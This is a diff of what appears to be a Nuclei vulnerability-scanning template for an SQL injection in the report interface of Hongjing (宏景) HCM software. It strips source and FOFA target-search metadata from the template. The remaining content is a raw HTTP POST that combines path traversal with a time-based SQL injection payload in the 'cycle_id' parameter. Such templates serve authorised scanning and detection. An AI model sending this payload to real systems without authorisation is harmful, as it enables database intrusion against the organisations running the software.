@@ -3,12 +3,8 @@ info:
   name: 宏景HCM-report 接口 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bpcf8stkew38r2nc'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bpcf8stkew38r2nc
-    fofa: app:"宏景 HCM"
 http:
 - raw:
   - 'POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1
@@ -36,8 +32,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     params=&isAction=2&cycle_id=2;waitfor%20delay%20''0:0:5''--%20
